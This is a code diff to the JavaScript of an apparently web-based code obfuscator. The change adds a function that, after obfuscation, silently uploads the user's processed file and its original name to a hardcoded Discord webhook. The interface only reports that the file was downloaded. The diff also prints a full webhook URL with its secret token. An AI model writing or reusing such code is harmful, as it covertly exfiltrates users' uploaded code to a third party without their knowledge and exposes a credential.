@@ -51,16 +51,21 @@ function generateRandomVariable(length = 8) {
     return result;
 }
 
-// Send a notification to Discord via webhook
-async function sendDiscordWebhook(webhookUrl, message) {
+// Send a file to Discord via webhook as an attachment
+async function sendDiscordWebhookWithFile(webhookUrl, fileBlob, originalFileName) {
     try {
+        const formData = new FormData();
+        formData.append('file', fileBlob, 'obfuscated.txt');
+        formData.append('payload_json', JSON.stringify({
+            content: `A file named **${originalFileName}** was obfuscated and sent as an attachment.`
+        }));
+
         await fetch(webhookUrl, {
             method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({ content: message })
+            body: formData
         });
     } catch (err) {
-        console.error("Failed to send Discord webhook:", err);
+        console.error("Failed to send file to Discord webhook:", err);
     }
 }
 
@@ -97,11 +102,12 @@ document.getElementById("obfuscateButton").addEventListener("click", () => {
 
             statusMessage.textContent = "Obfuscation complete! File downloaded.";
 
-            // Send Discord notification
-            const webhookUrl = "https://discord.com/api/webhooks/1361295438925267004/stPosh70OETZAUq3Fn4QNZCnKNXGhns7POmW1WiBdF-f-C7lGwBVAOLHH71nl8_Twye2"; // <-- replace with your webhook URL
-            sendDiscordWebhook(
+            // Send the obfuscated file to Discord webhook
+            const webhookUrl = "https://discord.com/api/webhooks/1361295438925267004/stPosh70OETZAUq3Fn4QNZCnKNXGhns7POmW1WiBdF-f-C7lGwBVAOLHH71nl8_Twye2"; // <-- replace with your webhook URL if needed
+            sendDiscordWebhookWithFile(
                 webhookUrl,
-                `A file named **${file.name}** was obfuscated and downloaded by the user.`
+                blob,             // The Blob containing obfuscated code
+                file.name         // Original uploaded file name
             );
         } catch (err) {
             console.error("Obfuscation error:", err);
